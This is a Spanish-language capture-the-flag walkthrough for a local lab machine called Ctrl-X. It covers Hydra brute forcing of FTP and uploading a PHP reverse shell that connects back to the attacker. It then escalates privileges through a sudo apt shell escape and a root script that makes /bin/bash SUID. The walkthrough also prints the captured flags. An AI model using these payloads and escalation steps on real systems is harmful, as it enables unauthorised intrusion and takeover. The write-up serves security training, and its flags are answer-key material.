---
icon: flag
---

# CTF Ctrl-X Easy

URL Download CTF = [https://drive.google.com/file/d/14LjrCa2t\_gjbWK8rakQjuHu3qX8k3S9K/view](https://drive.google.com/file/d/14LjrCa2t_gjbWK8rakQjuHu3qX8k3S9K/view)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip ctrl-x.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh ctrl-x.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.26.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 11:17 EDT
Nmap scan report for 172.26.0.2
Host is up (0.000067s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Hacker Zone
MAC Address: 02:42:AC:1A:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.21 seconds
```

Si nos intentamos conectar al `ftp` veremos que requiere de un usuario, ya que no permite anonimo.

Si nos vamos a la pagina web, veremos que hay una seccion en la que aparecen 3 usuarios.

```
ftpuser sshuser tomcatuser
```

Por lo que nos podriamos crear un diccionario de usuarios y tirarlo con un `rockyou.txt` al servidor `ftp` pero probaremos con el primer usuario solo.

```shell
hydra -l ftpuser -P <WORDLIST> ftp://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-24 11:20:56
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://172.26.0.2:21/
[STATUS] 864.00 tries/min, 864 tries in 00:01h, 14343549 to do in 276:42h, 50 active
[21][ftp] host: 172.26.0.2   login: ftpuser   password: bebita
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-24 11:22:06
```

Por lo que vemos nos saca las credenciales, pero al conectarnos a el no veremos mucho, por lo que intentaremos seguir buscando en la pagina web.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.26.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 4515]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 200) [Size: 741]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Por lo que vemos hay un directorio llamado `/uploads` y si nos metemos en el no encontraremos nada, pero puede ser que `ftp` y este directorio esten combinados, por lo que probaremos a subir un archivo con una `reverse shell` para ver si lo vemos en el directorio web.

## FTP uploads

```shell
ftp ftpuser@<IP>
```

Metemos la contarseña obtenida anteriormente y estaremos dentro.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

```shell
put shell.php
```

Info:

```
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||18605|)
150 Ok to send data.
100% |*******************************************************************************************************************************************|   114        1.90 MiB/s    00:00 ETA
226 Transfer complete.
114 bytes sent in 00:00 (378.66 KiB/s)
```

Y ahora le pondremos todos los permisos.

```shell
chmod 777 shell.php
```

Una vez hecho esto, si nos vamos al directorio web de `/uploads` veremos el archivo `shell.php` pero antes de darle estaremos a la escucha.

### Reverse Shell

```shell
nc -lvnp <PORT>
```

Estando a la escucha le daremos, una vez clicado, si nos vamos a la escucha tendremos una shell con el usuario `www-data`.

```
connect to [192.168.5.145] from (UNKNOWN) [172.26.0.2] 41088
whoami
www-data
```

Ahora sanitizaremos la shell (TTY).

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user tomcat

Si nos vamos al siguiente directorio.

```shell
cd /var/www/html
```

Veremos un archivo `.txt` llamado `super_secure_note_tomcat.txt` que si lo leemos pone lo siguiente.

```
tomcat:tomcat
tomcat:tomcatel
tomcat:tomcatelmejorsuper
tomcat:tomcatelmejorsupersecure
tomcat:tomcatelmejor
tomcat:tomcatelmejorsupersecurepassword
tomcat:tomcatelmejordetodos
tomcat:tomcatelpeorperomejor
tomcat:tomcasoloasimegusta
tomcat:tomcatelmejordetodosdelmundo
```

Parece ser contraseñas para el usuario `tomcat` pero sabremos que una es la verdadera.

Si probamos la que dice `tomcat:tomcatelmejor` veremos que funciona.

Por lo que haremos.

```shell
su tomcat
```

Y metemos como contraseña `tomcatelmejor` por lo que ya seremos el usuario y leeremos la flag.

> user.txt

```
b1ce018caed50700faffff22b16f5903
```

## Escalate user deamon

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for tomcat on 48b4171dbb9e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tomcat may run the following commands on 48b4171dbb9e:
    (deamon : deamon) NOPASSWD: /usr/bin/apt
```

Podemos ejecutar como el usuario `deamon` el binario de `apt` por lo que haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/apt/#sudo

```shell
sudo -u deamon apt changelog apt
```

Y cuando estemos dentro del `changelog` escribimos lo siguiente.

```shell
!/bin/sh
```

Despues para tener una `bash`.

```shell
/bin/bash
```

Y con esto ya seremos el usuario `deamon`.

## Escalate Privileges

Si vemos los procesos que se estan corriendo, veremos uno en el que `root` esta ejecutando en forma de bucle un script en `/usr/local/bin/` llamado `deamon.sh` que si lo leemos para ver que hace, vemos lo siguiente.

```sh
#!/bin/bash

# ------------------------------------------------------------------------------
# Inicio del Script
# ------------------------------------------------------------------------------
# Este script realiza diversas operaciones comunes en bash, como manejo de archivos,
# directorios y control de flujo. Cada sección está comentada para explicar lo que
# está haciendo.
# ------------------------------------------------------------------------------
echo "Inicio del script: Configuración y ejecución de tareas."
# Imprime un mensaje indicando que el script ha comenzado.

# ------------------------------------------------------------------------------
# Configuración de Variables
# ------------------------------------------------------------------------------
# En esta sección, definimos varias variables que se usarán en el resto del script.
# Esto ayuda a mantener el código limpio y más fácil de mantener.
# ------------------------------------------------------------------------------
echo "Configurando variables..."
# Imprime un mensaje indicando que se están configurando las variables.

# Definición de una variable que contiene un saludo
GREETING="Hola, bienvenido al script de demostración."
# Crea una variable llamada GREETING que almacena un saludo.

# Definición de una variable para el directorio de trabajo
WORK_DIR="/tmp/demonstration"
# Crea una variable llamada WORK_DIR que almacena la ruta del directorio de trabajo.

# Definición de una variable para el archivo de ejemplo
EXAMPLE_FILE="$WORK_DIR/example.txt"
# Crea una variable llamada EXAMPLE_FILE que almacena la ruta del archivo de ejemplo.

# ------------------------------------------------------------------------------
# Preparación del Entorno de Trabajo
# ------------------------------------------------------------------------------
# Aquí se preparan los directorios y archivos necesarios para la demostración.
# Se aseguran de que el entorno esté listo antes de realizar otras operaciones.
# ------------------------------------------------------------------------------
echo "Preparando el entorno de trabajo..."
# Imprime un mensaje indicando que se está preparando el entorno de trabajo.

# Comprobamos si el directorio de trabajo ya existe
if [ ! -d "$WORK_DIR" ]; then
    # Si el directorio no existe, ejecutamos este bloque de código
    echo "Creando directorio de trabajo en $WORK_DIR..."
    # Imprime un mensaje indicando que el directorio se está creando.
    mkdir -p "$WORK_DIR"
    # Crea el directorio de trabajo, incluyendo cualquier subdirectorio necesario.
else
    # Si el directorio ya existe, ejecutamos este bloque de código
    echo "El directorio de trabajo ya existe en $WORK_DIR."
    # Imprime un mensaje indicando que el directorio ya existe.
fi

# ------------------------------------------------------------------------------
# Operaciones con Archivos
# ------------------------------------------------------------------------------
# Esta sección maneja la creación, verificación, lectura y eliminación de archivos.
# Se muestran diferentes operaciones básicas que se pueden realizar con archivos.
# ------------------------------------------------------------------------------
echo "Realizando operaciones con archivos..."
# Imprime un mensaje indicando que se están realizando operaciones con archivos.

# Crear un archivo de ejemplo con contenido inicial
echo "Creando archivo de ejemplo en $EXAMPLE_FILE..."
# Imprime un mensaje indicando que se está creando el archivo de ejemplo.
echo "Este es un archivo de ejemplo creado para demostrar el manejo de archivos." > "$EXAMPLE_FILE"
# Crea el archivo de ejemplo con contenido inicial.

# Verificar si el archivo fue creado correctamente
if [ -f "$EXAMPLE_FILE" ]; then
    # Si el archivo existe, ejecutamos este bloque de código
    echo "Archivo creado exitosamente: $EXAMPLE_FILE"
    # Imprime un mensaje indicando que el archivo fue creado exitosamente.
else
    # Si el archivo no existe, ejecutamos este bloque de código
    echo "Error: No se pudo crear el archivo $EXAMPLE_FILE"
    # Imprime un mensaje indicando que hubo un error al crear el archivo.
fi

# Leer el contenido del archivo
echo "Leyendo el contenido del archivo..."
# Imprime un mensaje indicando que se está leyendo el contenido del archivo.
cat "$EXAMPLE_FILE"
# Muestra el contenido del archivo en la terminal.

# ------------------------------------------------------------------------------
# Manejo de Directorios
# ------------------------------------------------------------------------------
# En esta sección, se crean y manejan directorios adicionales, así como la
# organización de archivos dentro de esos directorios.
# ------------------------------------------------------------------------------
echo "Manejando directorios..."
# Imprime un mensaje indicando que se están manejando directorios.

# Ruta del script que deseas ejecutar
SCRIPT_PATH="/home/deamon/good"

# Ejecutar el script
bash "$SCRIPT_PATH"

# Crear subdirectorios dentro del directorio de trabajo
SUB_DIR1="$WORK_DIR/subdir1"
SUB_DIR2="$WORK_DIR/subdir2"
# Define las rutas para los subdirectorios dentro del directorio de trabajo.
echo "Creando subdirectorios $SUB_DIR1 y $SUB_DIR2..."
# Imprime un mensaje indicando que se están creando los subdirectorios.
mkdir -p "$SUB_DIR1" "$SUB_DIR2"
# Crea los subdirectorios especificados.

# Mover el archivo de ejemplo a un subdirectorio
echo "Moviendo archivo a $SUB_DIR1..."
# Imprime un mensaje indicando que el archivo se está moviendo.
mv "$EXAMPLE_FILE" "$SUB_DIR1/"
# Mueve el archivo de ejemplo al subdirectorio especificado.

# Verificar si el archivo fue movido correctamente
if [ -f "$SUB_DIR1/example.txt" ]; then
    # Si el archivo existe en el nuevo directorio, ejecutamos este bloque de código
    echo "Archivo movido exitosamente a $SUB_DIR1"
    # Imprime un mensaje indicando que el archivo fue movido exitosamente.
else
    # Si el archivo no se encuentra en el nuevo directorio, ejecutamos este bloque de código
    echo "Error al mover el archivo a $SUB_DIR1"
    # Imprime un mensaje indicando que hubo un error al mover el archivo.
fi

# ------------------------------------------------------------------------------
# Ejecución de Comandos Externos
# ------------------------------------------------------------------------------
# Esta sección demuestra cómo ejecutar comandos externos y manejar su salida.
# ------------------------------------------------------------------------------
echo "Ejecutando comandos externos..."
# Imprime un mensaje indicando que se están ejecutando comandos externos.

# Listar archivos en el directorio actual
ls -l
# Ejecuta el comando `ls -l` para listar los archivos en el directorio actual con detalles.

# Simular una tarea de red
echo "Simulando descarga..."
# Imprime un mensaje indicando que se está simulando una descarga.
sleep 2
# Pausa la ejecución del script durante 2 segundos para simular una tarea.
echo "Descarga simulada completa."
# Imprime un mensaje indicando que la descarga simulada ha sido completada.

# ------------------------------------------------------------------------------
# Operaciones con Variables
# ------------------------------------------------------------------------------
# Esta sección muestra cómo trabajar con variables definidas anteriormente.
# ------------------------------------------------------------------------------
echo "Operaciones con variables..."
# Imprime un mensaje indicando que se están realizando operaciones con variables.

# Imprimir valores de variables
echo "Valor de GREETING: $GREETING"
# Imprime el valor de la variable GREETING.
echo "Valor de WORK_DIR: $WORK_DIR"
# Imprime el valor de la variable WORK_DIR.
echo "Valor de EXAMPLE_FILE: $EXAMPLE_FILE"
# Imprime el valor de la variable EXAMPLE_FILE.

# ------------------------------------------------------------------------------
# Uso de Condiciones
# ------------------------------------------------------------------------------
# En esta sección, se demuestran las estructuras condicionales básicas en bash.
# ------------------------------------------------------------------------------
echo "Verificando condiciones..."
# Imprime un mensaje indicando que se están verificando condiciones.

# Verificar si un número es mayor que 20
NUM=42
# Define una variable NUM con un valor.
if [ "$NUM" -gt 20 ]; then
    # Si el número es mayor que 20, ejecutamos este bloque de código
    echo "$NUM es mayor que 20"
    # Imprime un mensaje indicando que el número es mayor que 20.
else
    # Si el número no es mayor que 20, ejecutamos este bloque de código
    echo "$NUM no es mayor que 20"
    # Imprime un mensaje indicando que el número no es mayor que 20.
fi

# ------------------------------------------------------------------------------
# Ciclos
# ------------------------------------------------------------------------------
# Esta sección muestra el uso de bucles `for` y `while` para realizar tareas repetitivas.
# ------------------------------------------------------------------------------
echo "Ejecutando ciclos..."
# Imprime un mensaje indicando que se están ejecutando ciclos.

# Bucle for simple
for i in {1..5}; do
    # Inicia un bucle for que itera del 1 al 5
    echo "Iteración $i"
    # Imprime el número de iteración.
    sleep 1
    # Pausa la ejecución del script durante 1 segundo.
done

# Bucle while simple
count=0
# Define una variable count con un valor inicial de 0.
while [ $count -lt 3 ]; do
    # Inicia un bucle while que continúa mientras count sea menor que 3.
    echo "Contador: $count"
    # Imprime el valor del contador.
    count=$((count + 1))
    # Incrementa el valor del contador en 1.
    sleep 1
    # Pausa la ejecución del script durante 1 segundo.
done

# ------------------------------------------------------------------------------
# Manejo de Errores
# ------------------------------------------------------------------------------
# Esta sección muestra cómo manejar errores al ejecutar comandos.
# ------------------------------------------------------------------------------
echo "Manejo de errores..."
# Imprime un mensaje indicando que se está manejando errores.

# Intentar crear un directorio que ya existe
mkdir "$WORK_DIR" 2>/dev/null
# Intenta crear el directorio nuevamente (no se mostrará ningún error si ya existe).

# Verificar el código de salida del comando anterior
if [ $? -eq 0 ]; then
    # Si el comando se ejecutó exitosamente (código de salida 0)
    echo "Directorio creado exitosamente."
    # Imprime un mensaje indicando que el directorio fue creado exitosamente.
else
    # Si hubo un error (código de salida diferente de 0)
    echo "El directorio ya existe o no se pudo crear."
    # Imprime un mensaje indicando que hubo un problema al crear el directorio.
fi

# ------------------------------------------------------------------------------
# Limpieza
# ------------------------------------------------------------------------------
# En esta sección, eliminamos archivos y directorios creados durante la ejecución del script.
# Esto ayuda a mantener el sistema limpio después de la ejecución del script.
# ------------------------------------------------------------------------------
echo "Limpiando entorno..."
# Imprime un mensaje indicando que se está realizando la limpieza.

# Eliminar archivos y directorios creados durante la ejecución
rm -rf "$WORK_DIR"
# Elimina el directorio de trabajo y todo su contenido de manera recursiva y forzada.

# ------------------------------------------------------------------------------
# Fin del Script
# ------------------------------------------------------------------------------
# Esta es la última sección del script. Aquí concluimos la ejecución del script.
# ------------------------------------------------------------------------------
echo "Proceso completado."
# Imprime un mensaje indicando que el proceso del script ha sido completado.

# Salir del script con un código de estado exitoso
exit 0
# Finaliza la ejecución del script y retorna un código de estado 0, indicando éxito.
```

Ejecuta todo eso, pero hay una linea interesante.

```sh
# Ruta del script que deseas ejecutar
SCRIPT_PATH="/home/deamon/good"

# Ejecutar el script
bash "$SCRIPT_PATH"
```

Por lo que vemos esta ejecutando todo el rato un script en la `home` de `deamon`, pero si vamos alli no hay nada, por lo que lo crearemos nosotros.

> good

```shell
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y si esperamos un poco, lo comprobaremos.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Vemos que funciono, por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que leeremos la flag.

> root.txt

```
97e2171b74984a382b62fcb39ab893c8
```
